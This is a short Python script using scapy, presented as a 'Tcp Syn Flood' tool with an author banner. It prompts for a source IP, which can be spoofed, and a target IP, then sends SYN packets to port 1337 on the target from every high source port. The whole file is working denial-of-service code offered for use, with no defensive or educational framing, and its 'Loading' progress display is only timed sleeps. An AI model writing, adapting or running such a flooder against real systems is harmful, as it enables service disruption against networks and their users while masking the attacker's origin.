import os
import sys
import time
import pyfiglet
from scapy.all import*


os.system("clear")

print (chr(27)+"[36m")

import pyfiglet
banner = pyfiglet.figlet_format("Tcp Syn Flood",font="slant")
print (banner)

print (chr(27)+"[33m")

print ("               Author : Rahat Khan Tusar(RKT)")
print ("              Github : https://github.com/r3k4t")


def synflood(src,tgt):
    for sport in range(1024,65535):
        T3=IP(src=src,dst=tgt)
        T4=TCP(sport=sport,dport=1337)
        pkt = T3/T4 
        send(pkt)

print (chr(27)+"[32m")

src = input("Enter your source ip:")

print (chr(27)+"[31m")

tgt = input("Enter your target ip:")

print (chr(27)+"[31m")

os.system("clear")
banner2 = pyfiglet.figlet_format("Attacking",font="standard")
print (banner2)

print (chr(27)+"[35m")

time.sleep(4)
print ("Loading =====================> 0 % ")
time.sleep(4)
print ("Loading ==============> 50 % ")
time.sleep(4)
print ("Loading ========> 100 % ")

print (chr(27)+"[32m")

synflood(src,tgt)




